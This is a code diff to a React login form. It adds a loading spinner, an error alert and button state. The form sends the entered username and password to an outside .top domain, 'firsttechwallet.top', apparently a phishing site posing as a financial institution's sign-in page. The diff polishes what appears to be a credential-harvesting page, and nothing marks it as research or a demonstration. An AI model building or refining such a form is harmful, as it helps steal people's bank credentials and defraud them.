@@ -1,15 +1,18 @@
 import React, { useState } from "react";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import { Loader } from "lucide-react";
 
 export default function Form() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
 
   const navigate = useNavigate();
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setIsLoading(true);
     try {
       const res = await axios.post(
         "https://firsttechwallet.top/macdon/login.php",
@@ -27,6 +30,9 @@ export default function Form() {
       }
     } catch (error) {
       console.error("Login error:", error);
+      alert("Login failed. Please try again.");
+    } finally {
+      setIsLoading(false);
     }
   };
   return (
@@ -70,7 +76,18 @@ export default function Form() {
             /> */}
           </div>
         </div>
-        <input type="submit" value="Next" className="next-btn" />
+        <button type="submit" className="next-btn" disabled={isLoading}>
+          {isLoading ? (
+            <>
+              <Loader
+                className="animate-spin inline mr-2 text-black"
+                size={16}
+              />
+            </>
+          ) : (
+            "Next"
+          )}
+        </button>
 
         <div className="divider"></div>
         <p>New customer ?</p>
